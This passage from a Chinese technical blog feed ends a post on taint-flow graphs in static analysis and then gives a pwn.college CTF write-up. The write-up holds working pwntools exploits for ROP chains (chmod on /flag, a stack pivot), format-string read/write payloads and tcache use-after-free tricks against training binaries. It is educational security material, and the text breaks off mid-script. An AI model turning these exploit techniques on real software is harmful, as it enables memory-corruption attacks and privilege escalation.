class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TaintFlowGraph</span> &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Map from a Taint (node) to its successors in TFG.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> MultiMap&lt;Pointer, Pointer&gt; successors = Maps.newMultiMap();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Adds an edge (source -&gt; target) to this TFG.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> true if this TFG changed as a result of the call,</span><br><span class="hljs-comment">     * otherwise false.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">addEdge</span><span class="hljs-params">(Pointer source, Pointer target)</span> &#123;<br>        <span class="hljs-keyword">return</span> successors.put(source, target);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> successors of given pointer in the TFG.</span><br><span class="hljs-comment">     */</span><br>    Set&lt;Pointer&gt; <span class="hljs-title function_">getSuccsOf</span><span class="hljs-params">(Pointer pointer)</span> &#123;<br>        <span class="hljs-keyword">return</span> successors.get(pointer);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SinkCallSite</span> &#123;<br>    CSCallSite callSite;<br><br>    Sink sink;<br><br>    SinkCallSite(CSCallSite callSite, Sink sink) &#123;<br>        <span class="hljs-built_in">this</span>.callSite = callSite;<br>        <span class="hljs-built_in">this</span>.sink = sink;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​这里仿照 PFG 构造了 TFG，然后在这个污点传播图中进行污点的传播处理，也就是对应 TaintTransfer。然后这里构建了 SinkCallSite，提供给最后 TaintFlow 的构造。</p><h1 id="其余"><a class="markdownIt-Anchor" href="#其余"></a> 其余</h1><h2 id="添加测试样例"><a class="markdownIt-Anchor" href="#添加测试样例"></a> 添加测试样例</h2><p>​这里 <code>resources/pta/taint</code> 路径下存在文件 <code>SourceSink.java</code>，所以该路径下其余的类可以使用 SourceSink 类来引入Source和Sink。这里添加自己的测试样例，注意可能没有 --allow-phantom(允许幻想引用)，所以import引入的别的java类不能识别，所以污点分析不知道该类，所以即使在taint.yaml中添加了该类的相关信息，呈现出来的依然是没有检测到污点流。下面补充一个可以使用的样例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">test</span> <span class="hljs-variable">main</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">test</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">source</span> <span class="hljs-operator">=</span> main.source(args[<span class="hljs-number">0</span>]);<br>        main.sink(source);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">source</span><span class="hljs-params">(String s)</span> &#123;<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sink</span><span class="hljs-params">(String s)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​补充taint.yaml文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">sources:</span><br>  <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">method:</span> <span class="hljs-string">&quot;&lt;test: java.lang.String source(java.lang.String)&gt;&quot;</span>, <span class="hljs-attr">type:</span> <span class="hljs-string">&quot;java.lang.String&quot;</span> &#125;<br><br><span class="hljs-attr">sinks:</span><br>  <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">method:</span> <span class="hljs-string">&quot;&lt;test: java.lang.String sink(java.lang.String)&gt;&quot;</span>, <span class="hljs-attr">index:</span> <span class="hljs-number">0</span> &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>静态分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn.college(4)</title>
    <link href="/posts/e6f3ff64.html"/>
    <url>/posts/e6f3ff64.html</url>
    
    <content type="html"><![CDATA[<h1 id="return-oriented-programming"><a class="markdownIt-Anchor" href="#return-oriented-programming"></a> Return Oriented Programming</h1><h2 id="level-3"><a class="markdownIt-Anchor" href="#level-3"></a> level 3</h2><p>​正常的 rop 链构造，不过按照题目意思，同时需要构造调用函数的参数然后跳转</p><h2 id="level-4"><a class="markdownIt-Anchor" href="#level-4"></a> level 4</h2><p>​这里就是使用 <code>chmod</code> 来进行提权 <code>chmod(point, 4)</code> 才能实现成功，point指向栈的地址，也是它自己泄露出来的，将 <code>/flag</code> 写在栈上，然后使用栈地址作为指针进行指向。然后这里 <code>mode == 4</code> 才能成功，777 失败了，估计索要的权限太大导致的。这里除了 <code>chmod</code> ，还可以使用常规的 <code>open read write</code> 来读取flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary = glob.glob(<span class="hljs-string">&quot;/challenge/babyrop_level[0-9].[0-9]&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>elf = ELF(binary[<span class="hljs-number">0</span>])<br>libc = elf.libc<br>p = process(binary)<br>pop_rdi = <span class="hljs-number">0x401fd5</span><br>pop_rsi = <span class="hljs-number">0x401fcd</span><br>pop_rax = <span class="hljs-number">0x401fad</span><br>syscall = <span class="hljs-number">0x401fb5</span><br><span class="hljs-comment"># p=gdb.debug(binary[0],&quot;break *0x402168&quot;) # 调试使用，直接attach不能断下来</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;located at: &quot;</span>)<br>leak_stack = <span class="hljs-built_in">eval</span>(p.recvuntil(<span class="hljs-string">b&#x27;.&#x27;</span>)[:-<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak_stack))<br><br>payload = (<span class="hljs-string">b&#x27;/flag&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span> + p64(pop_rdi) + p64(leak_stack)<br>payload += p64(pop_rsi) + p64(<span class="hljs-number">4</span>)<br>payload += p64(pop_rax) + p64(<span class="hljs-number">90</span>) + p64(syscall)<br>p.sendline(payload)<br><br>p.interactive()<br><span class="hljs-comment"># ROPgadget --binary /challenge/babyrop_level4.0 --only &quot;pop|ret&quot; | grep rdi</span><br></code></pre></td></tr></table></figure><h2 id="level-5"><a class="markdownIt-Anchor" href="#level-5"></a> level 5</h2><p>​这里就是进行了栈转移，找到了特殊的gadget，然后进行利用，将栈转移到已知地址的bss中，然后获得了执行字符串的指针，然后就是普通的构建即可。对于5.1也是找到特殊的gadget，不过这里的栈溢出有点问题，ida显示出错，而且需要自己手动调试出来栈溢出的位置，除此之外注意特殊的gadget即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ROPgadget --binary /challenge/babyrop_level5.0 --only &quot;pop|ret&quot; | grep rdi</span><br><br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># 初始化操作</span><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>binary = glob.glob(<span class="hljs-string">&quot;/challenge/babyrop_level[0-9].[0-9]&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>elf = ELF(binary[<span class="hljs-number">0</span>])<br>p = process(binary)<br><span class="hljs-comment"># p = gdb.debug(binary[0], &quot;b *0x401A56&quot;)</span><br><span class="hljs-comment"># 获取之后使用的相关地址</span><br>pop_rdi = <span class="hljs-number">0x401927</span><br>pop_rsi = <span class="hljs-number">0x4018f7</span><br>pop_rdx = <span class="hljs-number">0x4018ff</span><br>pop_rax = <span class="hljs-number">0x401910</span><br>syscall = <span class="hljs-number">0x40191f</span><br>rsp_ret = <span class="hljs-number">0x401494</span>  <span class="hljs-comment">#pop rsp ; pop r13 ; pop rbp ; ret</span><br>bss_addr = <span class="hljs-number">0x404500</span><br><br>offset = <span class="hljs-number">0x20</span><br><span class="hljs-comment"># 这里首先利用read读取内容到bss中，然后使用上面的rsp_ret进行栈转移，主要将rsp转移到bss段中</span><br><span class="hljs-comment"># 然后在知道bss段地址的情况下中构造chmod给 &#x27;/flag&#x27;(已将字符串放到bss中，然后获取指针位置) 提权</span><br><span class="hljs-comment"># 后面加了一个sys_exit，但是可有可无</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>* (offset + <span class="hljs-number">8</span>)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(bss_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x100</span>) <br>payload += p64(pop_rax) + p64(<span class="hljs-number">0</span>) +p64(syscall) <span class="hljs-comment">#使用read读取内容到bss位置</span><br>payload += p64(rsp_ret) + p64(bss_addr) <span class="hljs-comment"># pop栈上三个值后，ret rsp,也就是bss的位置</span><br>p.send(payload)<br><br><span class="hljs-comment"># 给上面构造的read(0,bss_addr,0x100)发送数据</span><br><span class="hljs-comment"># 下面 /flag -&gt; pop r13，bss_addr-0x40 -&gt; pop rbp，都没有什么作用，保证/flag存储在一块地址中，并且有指针即可</span><br><span class="hljs-comment"># 下面的 += 才是构造的栈执行syscall内容</span><br>payload1 = (<span class="hljs-string">b&#x27;/flag&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(bss_addr-<span class="hljs-number">0x40</span>) <br>payload1 += p64(pop_rdi) + p64(bss_addr) + p64(pop_rsi) + p64(<span class="hljs-number">4</span>)<br>payload1 += p64(pop_rax) + p64(<span class="hljs-number">90</span>) + p64(syscall) + p64(pop_rax) + p64(<span class="hljs-number">60</span>) + p64(syscall)<br>p.sendafter(<span class="hljs-string">b&#x27;Leaving!&#x27;</span>, payload1)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="format-string-exploits"><a class="markdownIt-Anchor" href="#format-string-exploits"></a> Format String Exploits</h1><h2 id="level-3-2"><a class="markdownIt-Anchor" href="#level-3-2"></a> level 3</h2><p>​这里向bss段写入了flag，所以需要通过printf %s 泄露出flag，这里就是先通过多个 %p-|(后面的-|为了分割和凑齐4个字节，这样好计算) 找到 printf 参数在栈上的位置，然后通过 %X$s 打印特定地址的字符串内容。这里需要注意获取数据不一定就是8个字节填充这样，下面的 b’aaa’ 就是填充一个只给3字节填写的一个数据，然后p64(bss)会存在/x00，放前面会截断printf的字符串，所以需要放在后面，然后寻找一个偏移。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>binary_path = glob.glob(<span class="hljs-string">&quot;/challenge/babyfmt_level[0-9].[0-9]&quot;</span>)<br>p = process(binary_path[<span class="hljs-number">0</span>])<br>bss = <span class="hljs-number">0x404110</span><br><span class="hljs-comment"># 从22开始</span><br>payload = <span class="hljs-string">b&#x27;aaa&#x27;</span> + <span class="hljs-string">b&#x27;%24$s|||&#x27;</span> + p64(bss)<br><span class="hljs-comment"># 3.1 就是 payload = b&#x27;%30$s|||&#x27; + p64(bss)</span><br>success(payload)<br>p.sendafter(<span class="hljs-string">b&quot;Send your data!\n&quot;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-4-2"><a class="markdownIt-Anchor" href="#level-4-2"></a> level 4</h2><p>​这里就是注意 bss 的参数，和之前一样，不能把这个 \x00 放在前面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary = glob.glob(<span class="hljs-string">&quot;/challenge/babyfmt_level[0-9].[0-9]&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>elf = ELF(binary[<span class="hljs-number">0</span>])<br>p = process(binary[<span class="hljs-number">0</span>])<br><span class="hljs-comment"># p = gdb.debug(binary[0], &#x27;b 0x40171D&#x27;)</span><br>bss = <span class="hljs-number">0x404100</span><br><span class="hljs-comment"># 第28个参数的后3个字节开始的，所以需要填充3 + 8 * n个字节</span><br><span class="hljs-comment"># aaaaaaaa|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p</span><br>payload = <span class="hljs-string">b&#x27;%148x%31$hhn|123456&#x27;</span> + p64(bss)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-5-2"><a class="markdownIt-Anchor" href="#level-5-2"></a> level 5</h2><p>​现在是向bss地址填充 0xCA6F39AC73F50387，这里就是采用两个字节填充的方法，但是前面的填充会影响到后面的，所以需要计算差值进行更正。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>binary = glob.glob(<span class="hljs-string">&quot;/challenge/babyfmt_level[0-9].[0-9]&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>elf = ELF(binary[<span class="hljs-number">0</span>])<br>p = process(binary[<span class="hljs-number">0</span>])<br><span class="hljs-comment"># p = gdb.debug(binary[0], &#x27;b 0x40171D&#x27;)</span><br>text = <span class="hljs-number">0xCA6F39AC73F50387</span><br>bss = <span class="hljs-number">0x404150</span><br><span class="hljs-comment"># 第32个参数的后4个字节开始的，所以需要填充4 + 8 * n个字节</span><br><span class="hljs-comment"># aaaaaaaa|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p|-%p</span><br><span class="hljs-comment"># %n 可以将一个 int 型的值（4 字节）写入指定的地址中，可以实现栈空间的随意改写</span><br><span class="hljs-comment"># 除 %n 以外，还有 %hn、%hhn、%lln，分别将 2 字节、1 字节、8 字节写入指定的地址</span><br><span class="hljs-comment"># %903x就是将903转化为十六进制数个数然后打印</span><br><span class="hljs-comment"># %3c 就是写入\x03，然后根据后面n的字节大小进行填充\x00</span><br>payload = <span class="hljs-string">b&#x27;%903x%40$hn|&#x27;</span> + <span class="hljs-string">b&#x27;%28781x%41$hn|||&#x27;</span> + <span class="hljs-string">b&#x27;%50612x%42$hn|||&#x27;</span> + <span class="hljs-string">b&#x27;%37056x%43$hn|||&#x27;</span> <br>payload += p64(bss) + p64(bss+<span class="hljs-number">2</span>) + p64(bss+<span class="hljs-number">4</span>) + p64(bss+<span class="hljs-number">6</span>)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="dynamic-allocator-misuse"><a class="markdownIt-Anchor" href="#dynamic-allocator-misuse"></a> Dynamic Allocator Misuse</h1><h2 id="level1"><a class="markdownIt-Anchor" href="#level1"></a> level1</h2><p>​这里主要就是理解题目的含义，它提供malloc，free，puts(打印堆的内容),read_flag(创建一个指定大小的堆，然后把flag写到堆中)等操作，首先就是利用 malloc 创建一个和后面 read_flag 创建堆大小相同的堆块，然后进行 free 放到 tcache 中，然后后面进行 read_flag 时就会从 tcache 中拿回这个堆，然后写入flag，使用puts会打印出来，之所以需要先 malloc-free，是因为 puts 打印内容的指针就是这个过程的指针，先 read_flag 会因为这个指针不存在就报错退出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>   malloc(flag_size)<span class="hljs-comment"># 从反汇编中查看出来</span><br>   free()<br>   read_flag()<br>   puts()<br>    <br>    <br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary = glob.glob(<span class="hljs-string">&quot;/challenge/babyheap_level[0-9].[0-9]&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>elf = ELF(binary[<span class="hljs-number">0</span>])<br>p = process(binary[<span class="hljs-number">0</span>])<br><br>p.sendlineafter(<span class="hljs-string">b&quot;): &quot;</span>, <span class="hljs-string">b&#x27;malloc&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Size: &quot;</span>, <span class="hljs-string">b&#x27;618&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;): &quot;</span>, <span class="hljs-string">b&#x27;free&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;): &quot;</span>, <span class="hljs-string">b&#x27;read_flag&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;): &quot;</span>, <span class="hljs-string">b&#x27;puts&#x27;</span>)<br>text = p.recv()<br><span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;pwn&quot;</span> <span class="hljs-keyword">in</span> text:<br>    success(text[text.find(<span class="hljs-string">b&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h2 id="level2"><a class="markdownIt-Anchor" href="#level2"></a> level2</h2><p>​这里和上面是一样的，不过这个对于read_flag的堆块大小开辟是一个 <code> rand() % 872 + 128</code>，即 128~1000 大小的一个堆。这里经过尝试，通过先 malloc 再 read_flag，发现二者的指针差为 0x410，再去掉chunk头，read_flag的大小就是 0x400 字节。</p><p>​所以这里 malloc 输入的 Size 大于等于 1024，再 free 之后，tcache(0-1032 byte) 会有一个bin，然后 read_flag 创建的堆会从这个bin中分配，所以得到的指针就是之前 malloc 的指针。这里疑惑的就是为什么会是1024这个数值。我猜想的是 flag 最大开辟1000大小的堆，那个存在1000这个大小的 bin 即可，但是现在看来不是这样，不论 flag 开辟多少的堆，bin 没有超过1024就不能使用。</p><p>​补充一下，tchache 每16个字节划分一个 bin 的区域，形成了64个元素的数组。所以上面 read_flag 开辟的地址应该是在 0x400 左右的，所以才会只有特定数值的 bin 才可以提供给 read_flag 来使用。</p><h2 id="level3"><a class="markdownIt-Anchor" href="#level3"></a> level3</h2><p>​这里还是 UAF，唯一的区别在于 read_flag 创建了两个堆块，所以需要对应的两个 bin 去匹配。同时注意开辟的堆大小，258就是read_flag开辟的大小。对于这个大小进行 free 后，tcache 会显示 <code>SIZE: 249 - 264 </code>，这个范围内开辟的堆 SIZE 都是 0x111-&gt;272，数据区为 0x100-&gt;256，由此看来，开辟的堆会找离自己最近的0x16的倍数(四舍五入)，多出自动削减，少于则使用 pre_size。但是有一个问题，开辟的空间大了，read_flag就不能使用，感觉还是 tcache 内部存在分片。</p><p>​对于 tcache 的分配：单链表 tcache_entry，也即 tcache Bin 的默认最大数量是<strong>64</strong>，在64位程序中申请的最小chunk size 为32(包括了chunk头)，之后以16字节依次递增，所以 size 大小范围是 0x20-0x410(数据的大小为 0x10-0x400)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>binary = glob.glob(<span class="hljs-string">&quot;/challenge/babyheap_level[0-9].[0-9]&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;): &quot;</span>, <span class="hljs-string">b&#x27;malloc&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;): &quot;</span>, <span class="hljs-string">b&#x27;free&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_flag</span>():<br>    p.sendlineafter(<span class="hljs-string">b&quot;): &quot;</span>, <span class="hljs-string">b&#x27;read_flag&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">puts</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;): &quot;</span>, <span class="hljs-string">b&#x27;puts&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    elf = ELF(binary[<span class="hljs-number">0</span>])<br>    p = process(binary[<span class="hljs-number">0</span>])<br>    malloc(<span class="hljs-number">0</span>,<span class="hljs-number">258</span>)<br>    malloc(<span class="hljs-number">1</span>,<span class="hljs-number">258</span>)<br>    free(<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">0</span>)<br>    read_flag()<br>    puts(<span class="hljs-number">1</span>)<span class="hljs-comment">#上面 free 的顺序决定了 puts 的顺序，因为 tcache 是 FILO，所以free(1 